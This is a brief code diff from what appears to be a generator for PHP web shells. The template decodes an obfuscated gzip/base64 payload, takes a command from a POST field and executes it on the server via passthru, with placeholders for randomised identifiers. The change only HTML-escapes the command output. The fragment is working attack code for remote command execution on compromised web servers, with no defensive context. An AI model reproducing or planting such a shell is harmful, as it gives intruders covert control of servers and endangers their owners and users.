@@ -56,7 +56,7 @@ $%s = gzinflate(base64_decode("%s"));
 
 function %s($%s){
     echo "<%s>$ ".$%s."</%s><br>";
-    echo passthru($%s." 2>&1");
+    echo htmlentities(passthru($%s." 2>&1"), ENT_IGNORE);
 }
 @$%s=$_POST["%s"];
 echo preg_replace("/%s/", basename($_SERVER["SCRIPT_NAME"]), $%s);
